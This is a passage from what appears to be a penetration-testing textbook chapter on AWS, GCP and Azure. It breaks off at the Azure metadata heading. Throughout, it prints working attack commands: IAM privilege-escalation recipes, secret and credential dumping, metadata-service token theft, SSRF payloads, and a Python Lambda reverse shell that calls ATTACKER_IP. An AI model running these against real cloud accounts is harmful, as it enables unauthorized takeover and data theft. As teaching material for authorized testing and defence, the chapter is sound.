# Chapter 2: Cloud Infrastructure Penetration Testing

## Table of Contents
1. [Introduction to Cloud Penetration Testing](#introduction)
2. [AWS Penetration Testing](#aws-pentesting)
3. [GCP Security Assessment](#gcp-security)
4. [Azure Penetration Testing](#azure-pentesting)
5. [IAM Misconfiguration Exploitation](#iam-misconfigs)
6. [Storage Service Vulnerabilities](#storage-security)
7. [Serverless and Container Security](#serverless-containers)
8. [Metadata Service Exploitation](#metadata-service)
9. [Cloud-Native Security Tools](#cloud-tools)
10. [Multi-Cloud Security Considerations](#multi-cloud)
11. [Cloud Incident Response and Forensics](#cloud-forensics)

---

## Introduction to Cloud Penetration Testing

Cloud infrastructure penetration testing represents a paradigm shift from traditional on-premises security assessments. The shared responsibility model, dynamic resource provisioning, and unique service architectures require penetration testers to develop specialized skills and methodologies. This chapter provides comprehensive coverage of cloud security testing across the three major providers: Amazon Web Services (AWS), Google Cloud Platform (GCP), and Microsoft Azure.

### The Shared Responsibility Model

Understanding the shared responsibility model is fundamental to cloud penetration testing. Cloud providers are responsible for the security "of" the cloud (physical infrastructure, hypervisors, network infrastructure), while customers are responsible for security "in" the cloud (data, applications, operating systems, network configurations, and identity management).

**Provider Responsibilities**:
- Physical security of data centers
- Network infrastructure and DDoS protection
- Hypervisor security and isolation
- Host operating systems (managed services)

**Customer Responsibilities**:
- Data classification and encryption
- Identity and access management configuration
- Application security
- Operating system patching (IaaS)
- Network security groups and firewall rules
- Client-side encryption and key management

### Cloud Penetration Testing Methodology

**Phase 1: Reconnaissance and Discovery**
- Identify cloud provider and services in use
- Discover public-facing assets and APIs
- Enumerate storage buckets, databases, and compute instances
- Map the cloud attack surface

**Phase 2: Identity and Access Management Assessment**
- Analyze IAM policies, roles, and permissions
- Identify privilege escalation paths
- Test for weak credentials and misconfigurations

**Phase 3: Data Storage and Database Security**
- Assess storage bucket permissions
- Test database security configurations
- Evaluate encryption implementations

**Phase 4: Compute and Network Security**
- Analyze virtual machine configurations
- Test network segmentation and security groups
- Assess container and serverless security

**Phase 5: Service-Specific Testing**
- Test cloud-native services (Lambda, Functions, etc.)
- Assess managed database and cache services
- Evaluate logging and monitoring configurations

---

## AWS Penetration Testing

Amazon Web Services dominates the cloud market, making AWS security expertise essential for penetration testers. AWS provides specific guidelines for penetration testing that must be followed to ensure compliance.

### AWS Pentesting Rules of Engagement

Before testing, understand AWS's Authorized Penetration Testing policy:

**Permitted Activities**:
- EC2 instance testing (your own instances)
- RDS instance testing (your own databases)
- CloudFront and Route 53 testing
- API Gateway testing
- Lambda and Elastic Beanstalk testing

**Prohibited Activities**:
- Testing physical hardware
- Testing managed services (DynamoDB, S3, etc.) infrastructure
- DNS zone walking via Route 53
- Denial of service testing (without approval)

### AWS Enumeration and Reconnaissance

**Account ID Enumeration**:
```bash
# Enumerate account ID from public S3 bucket error messages
aws s3 ls s3://target-bucket --no-sign-request 2>&1 | grep -oP '\d{12}'

# Use IAM role assumption to discover account structure
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME
```

**AWS CLI Configuration and Reconnaissance**:
```bash
# Configure AWS CLI with compromised credentials
aws configure
# Or use environment variables
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_DEFAULT_REGION=us-east-1

# Enumerate current identity
aws sts get-caller-identity

# List all regions
aws ec2 describe-regions --all-regions

# Enumerate organization structure (if accessible)
aws organizations list-accounts
```

**S3 Bucket Enumeration**:
```bash
# List all buckets in account
aws s3 ls

# Detailed bucket enumeration with s3scanner
python3 -m pip install s3scanner
s3scanner --buckets buckets.txt --dump

# Using Bucket Stream for real-time discovery
git clone https://github.com/eth0izzle/bucket-stream.git
cd bucket-stream
pip3 install -r requirements.txt
python3 bucket-stream.py

# Automated S3 enumeration with slurp
git clone https://github.com/bbb31/slurp.git
cd slurp && go build
./slurp domain -t target.com
```

**CloudFront Distribution Enumeration**:
```bash
# List CloudFront distributions
aws cloudfront list-distributions

# Get distribution details
aws cloudfront get-distribution --id DISTRIBUTION_ID
```

**Route 53 Enumeration**:
```bash
# List hosted zones
aws route53 list-hosted-zones

# List resource record sets
aws route53 list-resource-record-sets --hosted-zone-id ZONE_ID
```

### AWS IAM Privilege Escalation

**IAM Enumeration**:
```bash
# List current user permissions
aws iam list-user-policies --user-name USERNAME
aws iam list-attached-user-policies --user-name USERNAME

# List all policies
aws iam list-policies --scope Local

# Get policy details
aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/POLICY_NAME
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/POLICY_NAME --version-id v1

# List roles and their trust relationships
aws iam list-roles
aws iam get-role --role-name ROLE_NAME

# List instance profiles
aws iam list-instance-profiles
```

**Common Privilege Escalation Paths**:

```bash
# 1. iam:CreatePolicyVersion escalation
# If you have iam:CreatePolicyVersion on a policy attached to your user
aws iam create-policy-version \
    --policy-arn arn:aws:iam::ACCOUNT_ID:policy/VICTIM_POLICY \
    --policy-document file://admin-policy.json \
    --set-as-default

# admin-policy.json content:
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}

# 2. iam:SetDefaultPolicyVersion escalation
aws iam set-default-policy-version \
    --policy-arn arn:aws:iam::ACCOUNT_ID:policy/VICTIM_POLICY \
    --version-id v2

# 3. iam:CreateAccessKey escalation (on another user)
aws iam create-access-key --user-name admin

# 4. iam:UpdateAssumeRolePolicy + sts:AssumeRole
cat > trust-policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::ACCOUNT_ID:user/your-user"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
EOF

aws iam update-assume-role-policy \
    --role-name TARGET_ROLE \
    --policy-document file://trust-policy.json

aws sts assume-role \
    --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \
    --role-session-name pentest

# 5. lambda:UpdateFunctionCode + lambda:InvokeFunction escalation
# Update a Lambda function with malicious code
aws lambda update-function-code \
    --function-name TARGET_FUNCTION \
    --zip-file fileb://payload.zip

aws lambda invoke \
    --function-name TARGET_FUNCTION \
    output.txt
```

**Pacu - AWS Exploitation Framework**:
```bash
# Install Pacu
pip3 install pacu

# Start Pacu
pacu

# Configure session
> import_keys --all
> whoami

# Run privilege escalation check
> run iam__privesc_scan

# Enumerate permissions
> run iam__enum_permissions

# Exploit specific privesc path
> run iam__backdoor_assume_role
```

**Cloudsplaining - IAM Assessment**:
```bash
# Install cloudsplaining
pip3 install cloudsplaining

# Download account authorization details
aws iam get-account-authorization-details > account-data.json

# Analyze
cloudsplaining scan --input-file account-data.json

# Generate HTML report
cloudsplaining scan --input-file account-data.json --output cloudsplaining-report/
```

### AWS EC2 Security Testing

**EC2 Enumeration**:
```bash
# List all instances across regions
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
    echo "=== $region ==="
    aws ec2 describe-instances --region $region --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress]'
done

# Get instance details
aws ec2 describe-instances --instance-ids i-xxxxxxxx

# List security groups
aws ec2 describe-security-groups

# Get security group details
aws ec2 describe-security-groups --group-ids sg-xxxxxxxx
```

**Security Group Analysis**:
```bash
# Find overly permissive security groups
aws ec2 describe-security-groups \
    --filters Name=ip-permission.cidr,Values='0.0.0.0/0' \
    --query 'SecurityGroups[].[GroupName,GroupId]'

# Find security groups allowing SSH from internet
aws ec2 describe-security-groups \
    --filters Name=ip-permission.from-port,Values=22 \
              Name=ip-permission.cidr,Values='0.0.0.0/0'
```

**SSM Parameter Extraction**:
```bash
# List SSM parameters
aws ssm describe-parameters

# Get parameter values (decrypt if necessary)
aws ssm get-parameter --name /prod/database/password --with-decryption

# Get parameters by path
aws ssm get-parameters-by-path --path /prod --recursive --with-decryption
```

**Secrets Manager Enumeration**:
```bash
# List secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id prod/api/key
```

### AWS Lambda and Serverless Security

**Lambda Enumeration**:
```bash
# List functions
aws lambda list-functions

# Get function details
aws lambda get-function --function-name FUNCTION_NAME

# List function policies
aws lambda get-policy --function-name FUNCTION_NAME

# Download function code
aws lambda get-function --function-name FUNCTION_NAME --query 'Code.Location' --output text | xargs wget -O function.zip
```

**Lambda Privilege Escalation**:
```bash
# Check Lambda execution role permissions
aws iam get-role --role-name LAMBDA_EXECUTION_ROLE

# If Lambda has iam:PassRole and can create functions:
# Create a new Lambda with elevated privileges
aws lambda create-function \
    --function-name backdoor \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT_ID:role/AdminRole \
    --handler lambda_function.handler \
    --zip-file fileb://payload.zip
```

---

## GCP Security Assessment

Google Cloud Platform presents unique security challenges with its resource hierarchy, IAM model, and service offerings. Understanding GCP's security architecture is essential for effective penetration testing.

### GCP Reconnaissance

**GCP CLI Configuration**:
```bash
# Authenticate with gcloud
gcloud auth activate-service-account --key-file credentials.json
gcloud config set project PROJECT_ID

# Or use application default credentials
gcloud auth application-default login

# Verify access
gcloud config list
gcloud projects describe PROJECT_ID
```

**Organization and Project Enumeration**:
```bash
# List accessible organizations
gcloud organizations list

# List projects
gcloud projects list

# Get project metadata
gcloud projects describe PROJECT_ID --format=json

# List project IAM policies
gcloud projects get-iam-policy PROJECT_ID

# Enumerate folders
gcloud resource-manager folders list --organization ORGANIZATION_ID
```

**Compute Engine Enumeration**:
```bash
# List all instances across all zones
gcloud compute instances list

# Get instance details
gcloud compute instances describe INSTANCE_NAME --zone=ZONE

# List disks
gcloud compute disks list

# List snapshots
gcloud compute snapshots list

# List firewalls
gcloud compute firewall-rules list
```

**Firewall Analysis**:
```bash
# Find overly permissive firewall rules
gcloud compute firewall-rules list --filter='sourceRanges:0.0.0.0/0' --format='table(name,sourceRanges,allowed)'

# Check for SSH access from anywhere
gcloud compute firewall-rules list --filter='allowed.ports:22' --format='table(name,sourceRanges)'
```

### GCP IAM Privilege Escalation

**IAM Enumeration**:
```bash
# List service accounts
gcloud iam service-accounts list

# Get service account details
gcloud iam service-accounts describe SERVICE_ACCOUNT_EMAIL

# List service account keys
gcloud iam service-accounts keys list --iam-account SERVICE_ACCOUNT_EMAIL

# Get IAM policy for project
gcloud projects get-iam-policy PROJECT_ID --format=json

# Test IAM permissions
gcloud iam list-testable-permissions //cloudresourcemanager.googleapis.com/projects/PROJECT_ID
```

**Service Account Impersonation**:
```bash
# List service accounts you can impersonate
gcloud iam service-accounts list --filter="email:service-account"

# Impersonate service account
gcloud auth activate-service-account \
    --key-file=service-account-key.json

# Or use impersonation without key
gcloud compute instances list \
    --impersonate-service-account=target@project.iam.gserviceaccount.com
```

**Common Privilege Escalation Paths**:

```bash
# 1. iam.serviceAccounts.actAs exploitation
# If you have iam.serviceAccounts.actAs on a service account with more privileges:
gcloud auth activate-service-account \
    --key-file=privileged-sa-key.json

# 2. compute.instances.setIamPolicy escalation
# Add yourself to instance-level IAM
gcloud compute instances add-iam-policy-binding INSTANCE_NAME \
    --zone=ZONE \
    --member="user:your-email@domain.com" \
    --role="roles/compute.admin"

# 3. deploymentmanager.deployments.create escalation
# Deploy resources with elevated service account
cat > escalation.yaml << 'EOF'
resources:
- name: privileged-instance
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/f1-micro
    serviceAccounts:
    - email: privileged@project.iam.gserviceaccount.com
      scopes:
      - https://www.googleapis.com/auth/cloud-platform
EOF

gcloud deployment-manager deployments create escalation \
    --config=escalation.yaml
```

**GCPBucketBrute for Storage Enumeration**:
```bash
# Clone and setup
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git
cd GCPBucketBrute
pip3 install -r requirements.txt

# Run enumeration
python3 gcpbucketbrute.py -k target-keyword
python3 gcpbucketbrute.py -f wordlist.txt
```

### GCP Storage Security

**Cloud Storage Enumeration**:
```bash
# List buckets
gsutil ls

# List bucket contents
gsutil ls -r gs://bucket-name

# Get bucket metadata
gsutil ls -L -b gs://bucket-name

# Check bucket IAM policy
gsutil iam get gs://bucket-name

# List objects with details
gsutil ls -L gs://bucket-name/**
```

**Cloud Storage Exploitation**:
```bash
# Download accessible bucket contents
gsutil -m cp -r gs://bucket-name ./downloaded-bucket

# Check for public access
gsutil iam get gs://bucket-name | grep allUsers
gsutil iam get gs://bucket-name | grep allAuthenticatedUsers

# Test write access to public bucket
echo "test" > test.txt
gsutil cp test.txt gs://bucket-name/
```

### GCP Cloud Functions and Serverless

**Cloud Functions Enumeration**:
```bash
# List functions
gcloud functions list

# Get function details
gcloud functions describe FUNCTION_NAME --region=REGION

# Get function source code
gcloud functions describe FUNCTION_NAME --region=REGION --format='value(sourceArchiveUrl)'

# Download source
wget -O function-source.zip $(gcloud functions describe FUNCTION_NAME --region=REGION --format='value(sourceArchiveUrl)')
```

**Cloud Run Enumeration**:
```bash
# List Cloud Run services
gcloud run services list

# Get service details
gcloud run services describe SERVICE_NAME --region=REGION
```

---

## Azure Penetration Testing

Microsoft Azure's enterprise focus and integration with Active Directory make it a common target for penetration testers. Azure's unique features require specialized testing approaches.

### Azure Enumeration and Reconnaissance

**Azure CLI and PowerShell Setup**:
```bash
# Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Login
az login
az account list
az account set --subscription SUBSCRIPTION_ID

# Or use service principal
az login --service-principal \
    --username APP_ID \
    --password PASSWORD \
    --tenant TENANT_ID
```

```powershell
# PowerShell Az module
Install-Module -Name Az -AllowClobber -Force
Connect-AzAccount
Get-AzContext
Set-AzContext -Subscription SUBSCRIPTION_ID
```

**Tenant and Subscription Enumeration**:
```bash
# List subscriptions
az account list --output table

# Get subscription details
az account show

# List resources in subscription
az resource list --output table

# Get resource providers
az provider list --output table
```

**Resource Group Enumeration**:
```bash
# List resource groups
az group list --output table

# Get resources in a group
az resource list --resource-group GROUP_NAME --output table
```

**Virtual Machine Enumeration**:
```bash
# List VMs
az vm list --output table

# Get VM details
az vm show --name VM_NAME --resource-group GROUP_NAME

# List VM extensions
az vm extension list --vm-name VM_NAME --resource-group GROUP_NAME

# Get VM user data (if available)
az vm get-instance-view --name VM_NAME --resource-group GROUP_NAME
```

**Network Security Analysis**:
```bash
# List network security groups
az network nsg list --output table

# Get NSG rules
az network nsg rule list --nsg-name NSG_NAME --resource-group GROUP_NAME --output table

# List public IPs
az network public-ip list --output table

# List network interfaces
az network nic list --output table
```

### Azure Active Directory Security

**Azure AD Enumeration with AzureHound**:
```bash
# Download AzureHound
wget https://github.com/BloodHoundAD/AzureHound/releases/download/v1.2.0/azurehound-linux-amd64.tar.gz
tar -xzf azurehound-linux-amd64.tar.gz

# Run AzureHound collection
./azurehound -u "user@domain.com" -p "password" list --tenant "tenant-id" -o output.json

# Or use refresh token
./azurehound -r "refresh_token" list --tenant "tenant-id" -o output.json
```

**Azure AD Enumeration with PowerShell**:
```powershell
# Install and import module
Install-Module -Name AzureAD -Force
Connect-AzureAD

# List users
Get-AzureADUser | Select-Object DisplayName,UserPrincipalName,ObjectId

# List groups
Get-AzureADGroup | Select-Object DisplayName,ObjectId

# Get group members
Get-AzureADGroupMember -ObjectId GROUP_OBJECT_ID

# List applications
Get-AzureADApplication | Select-Object DisplayName,ObjectId

# List service principals
Get-AzureADServicePrincipal | Select-Object DisplayName,ObjectId
```

**Microsoft Graph API Enumeration**:
```bash
# Get access token
token=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)

# Enumerate users
curl -H "Authorization: Bearer $token" \
     https://graph.microsoft.com/v1.0/users

# Enumerate groups
curl -H "Authorization: Bearer $token" \
     https://graph.microsoft.com/v1.0/groups

# Get group members
curl -H "Authorization: Bearer $token" \
     https://graph.microsoft.com/v1.0/groups/GROUP_ID/members
```

### Azure Privilege Escalation

**Role Assignment Enumeration**:
```bash
# List role assignments at subscription level
az role assignment list --output table

# List custom roles
az role definition list --custom-role-only --output table

# Get role definition
az role definition list --name "Owner"
```

**Common Privilege Escalation Paths**:

```bash
# 1. Role Assignment Escalation
# If you have Microsoft.Authorization/roleAssignments/write:
az role assignment create \
    --assignee your-user-id \
    --role "Owner" \
    --scope /subscriptions/SUBSCRIPTION_ID

# 2. VM Run Command exploitation
# Execute commands on VMs where you have Contributor access
az vm run-command invoke \
    --command-id RunPowerShellScript \
    --name TARGET_VM \
    --resource-group TARGET_RG \
    --scripts "whoami; net user; Get-Process"

# 3. Automation Account Runbook exploitation
az automation runbook list --automation-account-name ACCOUNT_NAME --resource-group RG_NAME
az automation runbook show --name RUNBOOK_NAME --automation-account-name ACCOUNT_NAME --resource-group RG_NAME

# Create and run malicious runbook
az automation runbook create \
    --resource-group RG_NAME \
    --automation-account-name ACCOUNT_NAME \
    --name malicious-runbook \
    --type PowerShell \
    --location eastus

az automation runbook replace-content \
    --resource-group RG_NAME \
    --automation-account-name ACCOUNT_NAME \
    --name malicious-runbook \
    --content 'Write-Output "Pwned"; Get-AutomationConnection -Name AzureRunAsConnection'

az automation runbook start \
    --resource-group RG_NAME \
    --automation-account-name ACCOUNT_NAME \
    --name malicious-runbook

# 4. Managed Identity token theft
# If you have access to a VM with managed identity:
token=$(curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" | jq -r .access_token)

# Use token to authenticate
curl -H "Authorization: Bearer $token" \
     https://management.azure.com/subscriptions/SUBSCRIPTION_ID/resources?api-version=2021-04-01
```

**ROADtools for Azure AD Exploitation**:
```bash
# Install ROADtools
pip3 install roadlib roadrecon roadtools

# Collect Azure AD data
roadrecon gather --username user@domain.com --password password

# Explore data with GUI
roadrecon-gui

# Or query the database
roadrecon dump -o output.json
```

### Azure Storage Security

**Storage Account Enumeration**:
```bash
# List storage accounts
az storage account list --output table

# Get storage account keys
az storage account keys list --account-name ACCOUNT_NAME --query '[].value' -o tsv

# Get storage account properties
az storage account show --name ACCOUNT_NAME --resource-group RG_NAME

# Check network rules
az storage account network-rule list --account-name ACCOUNT_NAME
```

**Blob Storage Security Testing**:
```bash
# List containers
az storage container list --account-name ACCOUNT_NAME --account-key KEY

# List blobs
az storage blob list --container-name CONTAINER_NAME --account-name ACCOUNT_NAME --account-key KEY

# Download blob
az storage blob download \
    --container-name CONTAINER_NAME \
    --name blob-name \
    --file local-file \
    --account-name ACCOUNT_NAME \
    --account-key KEY

# Check public access
az storage container show-permission \
    --name CONTAINER_NAME \
    --account-name ACCOUNT_NAME \
    --account-key KEY
```

**Blob Storage with sasurl**:
```bash
# Test SAS URL access
curl -s "https://account.blob.core.windows.net/container/blob?sv=...&st=...&se=...&sp=rwdl"

# Upload via SAS
curl -X PUT \
     -H "x-ms-blob-type: BlockBlob" \
     --data-binary @payload.txt \
     "https://account.blob.core.windows.net/container/payload.txt?sv=...&sp=w..."
```

---

## IAM Misconfiguration Exploitation

Identity and Access Management misconfigurations are the leading cause of cloud security breaches. Understanding how to identify and exploit these weaknesses is critical.

### AWS IAM Policy Analysis

**Policy Structure Analysis**:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": "*",
            "Condition": {
                "StringEquals": {
                    "aws:SourceIp": "10.0.0.0/8"
                }
            }
        }
    ]
}
```

**Dangerous IAM Actions**:
```bash
# Actions that commonly lead to privilege escalation
iam:CreateAccessKey
iam:CreateUser
iam:PutUserPolicy
iam:AttachUserPolicy
iam:PutRolePolicy
iam:AttachRolePolicy
iam:PutGroupPolicy
iam:AttachGroupPolicy
iam:CreatePolicyVersion
iam:SetDefaultPolicyVersion
iam:AddUserToGroup
iam:UpdateAssumeRolePolicy
iam:CreateRole
iam:PassRole
sts:AssumeRole
lambda:CreateFunction
lambda:UpdateFunctionCode
lambda:InvokeFunction
datapipeline:CreatePipeline
datapipeline:PutPipelineDefinition
```

**IAM Policy Simulator**:
```bash
# Test if specific actions are allowed
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/USERNAME \
    --action-names "s3:GetObject" "iam:CreateAccessKey" \
    --resource-arns "arn:aws:s3:::bucket/*"
```

### GCP IAM Misconfigurations

**Overly Permissive Service Accounts**:
```bash
# Check for default compute service account usage
gcloud compute instances list --format='table(name,zone,serviceAccounts[].email:label=Service_Account)'

# The default compute service account has Editor role on project
# If any VM uses this account and is compromised, full project access is gained
```

**Workload Identity Federation Issues**:
```bash
# Check workload identity pools
gcloud iam workload-identity-pools list --location=global

# List providers
gcloud iam workload-identity-pools providers list \
    --workload-identity-pool=POOL_ID \
    --location=global
```

### Azure RBAC Misconfigurations

**Dangerous Role Assignments**:
```bash
# List all role assignments
az role assignment list --all --output json | jq '.[] | {principalName, roleDefinitionName, scope}'

# Find users with Owner/Contributor at subscription scope
az role assignment list --all \
    --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor'].{name:principalName, role:roleDefinitionName, type:principalType}"
```

**Service Principal Abuse**:
```bash
# List service principals with credentials
az ad sp credential list --id SP_OBJECT_ID

# Check for service principals with high privileges
az role assignment list --assignee SP_OBJECT_ID
```

---

## Storage Service Vulnerabilities

Cloud storage services are frequently misconfigured, leading to data breaches. Comprehensive testing of storage configurations is essential.

### S3 Bucket Security Testing

**Comprehensive S3 Assessment**:
```bash
# 1. Permission enumeration
aws s3api get-bucket-acl --bucket BUCKET_NAME
aws s3api get-bucket-policy --bucket BUCKET_NAME
aws s3api get-bucket-policy-status --bucket BUCKET_NAME

# 2. Check for public access blocks
aws s3api get-public-access-block --bucket BUCKET_NAME

# 3. Check bucket encryption
aws s3api get-bucket-encryption --bucket BUCKET_NAME

# 4. Check versioning and MFA delete
aws s3api get-bucket-versioning --bucket BUCKET_NAME

# 5. Check logging configuration
aws s3api get-bucket-logging --bucket BUCKET_NAME

# 6. Check CORS configuration
aws s3api get-bucket-cors --bucket BUCKET_NAME
```

**S3 Misconfiguration Exploitation**:
```bash
# Download entire bucket if ListBucket is allowed
aws s3 sync s3://BUCKET_NAME ./bucket-contents

# Upload file to public bucket
aws s3 cp payload.txt s3://BUCKET_NAME/payload.txt

# Modify bucket policy if permissions allow
cat > malicious-policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::BUCKET_NAME",
                "arn:aws:s3:::BUCKET_NAME/*"
            ]
        }
    ]
}
EOF

aws s3api put-bucket-policy --bucket BUCKET_NAME --policy file://malicious-policy.json
```

### Azure Blob and File Storage Testing

**Storage Enumeration Script**:
```bash
#!/bin/bash
ACCOUNT_NAME="targetstorage"
KEY="storage-account-key"

# List containers
echo "=== Containers ==="
az storage container list --account-name $ACCOUNT_NAME --account-key $KEY --query '[].name' -o tsv

# For each container, list blobs
for container in $(az storage container list --account-name $ACCOUNT_NAME --account-key $KEY --query '[].name' -o tsv); do
    echo "=== Blobs in $container ==="
    az storage blob list --container-name $container --account-name $ACCOUNT_NAME --account-key $KEY --query '[].name' -o tsv
done

# Check file shares
echo "=== File Shares ==="
az storage share list --account-name $ACCOUNT_NAME --account-key $KEY --query '[].name' -o tsv
```

**Anonymous Access Testing**:
```bash
# Test for anonymous blob access
curl -s "https://ACCOUNT.blob.core.windows.net/CONTAINER/BLOB"

# List containers with public access
curl -s "https://ACCOUNT.blob.core.windows.net/?comp=list&restype=container"
```

### GCP Storage Security Assessment

**Cloud Storage Security Checklist**:
```bash
# Check bucket permissions
gsutil iam get gs://BUCKET_NAME

# Check uniform bucket-level access
gsutil uniformbucketlevelaccess get gs://BUCKET_NAME

# Check public access
gsutil iam get gs://BUCKET_NAME | grep -E "(allUsers|allAuthenticatedUsers)"

# Check retention policies
gsutil retention get gs://BUCKET_NAME

# Check encryption
gsutil encryption get gs://BUCKET_NAME

# Check logging
gsutil logging get gs://BUCKET_NAME
```

---

## Serverless and Container Security

Serverless functions and containerized applications introduce unique security considerations that penetration testers must address.

### AWS Lambda Security Assessment

**Lambda Environment Variable Extraction**:
```bash
# Get Lambda environment variables
aws lambda get-function-configuration \
    --function-name FUNCTION_NAME \
    --query 'Environment.Variables'

# Check for secrets in environment variables
aws lambda get-function-configuration \
    --function-name FUNCTION_NAME \
    --output json | jq '.Environment.Variables | to_entries[] | select(.value | contains("AKIA","secret","password","key"))'
```

**Lambda Layer Analysis**:
```bash
# List Lambda layers
aws lambda list-layers

# Get layer versions
aws lambda list-layer-versions --layer-name LAYER_NAME

# Download layer content
aws lambda get-layer-version \
    --layer-name LAYER_NAME \
    --version-number VERSION \
    --query 'Content.Location' --output text | xargs wget -O layer.zip
```

**Lambda Reverse Shell**:
```python
# payload.py - Lambda reverse shell payload
import socket
import subprocess
import os

def handler(event, context):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ATTACKER_IP", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
```

### Container Security in the Cloud

**Amazon ECR Enumeration**:
```bash
# List ECR repositories
aws ecr describe-repositories

# Get repository images
aws ecr describe-images --repository-name REPO_NAME

# Get image scan findings
aws ecr describe-image-scan-findings \
    --repository-name REPO_NAME \
    --image-id imageTag=latest

# Get repository policy
aws ecr get-repository-policy --repository-name REPO_NAME
```

**Amazon ECS Security Assessment**:
```bash
# List ECS clusters
aws ecs list-clusters

# List services
aws ecs list-services --cluster CLUSTER_ARN

# Get task definitions
aws ecs list-task-definitions

# Describe task definition
aws ecs describe-task-definition --task-definition TASK_DEF_ARN

# List tasks
aws ecs list-tasks --cluster CLUSTER_ARN

# Execute command in running container (if enabled)
aws ecs execute-command \
    --cluster CLUSTER_ARN \
    --task TASK_ARN \
    --container CONTAINER_NAME \
    --interactive \
    --command "/bin/sh"
```

**Kubernetes (EKS/GKE/AKS) Security Testing**:
```bash
# EKS cluster enumeration
aws eks list-clusters
aws eks describe-cluster --name CLUSTER_NAME

# Update kubeconfig
aws eks update-kubeconfig --name CLUSTER_NAME --region us-east-1

# List all resources
kubectl get all --all-namespaces

# Check for privileged pods
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'

# Check for service accounts with cluster-admin
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# Extract secrets from all namespaces
kubectl get secrets --all-namespaces -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, data: .data}'
```

---

## Metadata Service Exploitation

Cloud metadata services provide critical information about instances and can be a goldmine for attackers. Understanding how to exploit these services is essential.

### AWS EC2 Metadata Service

**IMDSv1 Exploitation**:
```bash
# Basic metadata queries
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/ami-id
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/instance-type
curl http://169.254.169.254/latest/meta-data/public-ipv4

# Get IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Get user-data (often contains scripts and configurations)
curl http://169.254.169.254/latest/user-data

# Get instance identity document
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

**IMDSv2 Exploitation**:
```bash
# IMDSv2 requires token-based authentication
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token for subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**SSRF to Metadata Service**:
```bash
# Test for SSRF to metadata service
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Often requires specific headers or IPv6
curl "https://target.com/fetch?url=http://[fd00:ec2::254]/latest/meta-data/"
curl "https://target.com/fetch?url=http://169.254.169.254.nip.io/latest/meta-data/"
```

### GCP Metadata Service

**Compute Metadata Access**:
```bash
# Query GCP metadata service
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Get project info
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# Get instance info
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/hostname
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Get access token
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get all scopes
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

**Token Extraction Script**:
```bash
#!/bin/bash
# extract_gcp_tokens.sh

echo "=== GCP Access Token ==="
curl -s -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

echo -e "\n=== All Service Accounts ==="
curl -s -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

for sa in $(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/); do
    echo -e "\n=== Token for $sa ==="
    curl -s -H "Metadata-Flavor: Google" \
         http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/token
done
```

### Azure Instance Metadata Service

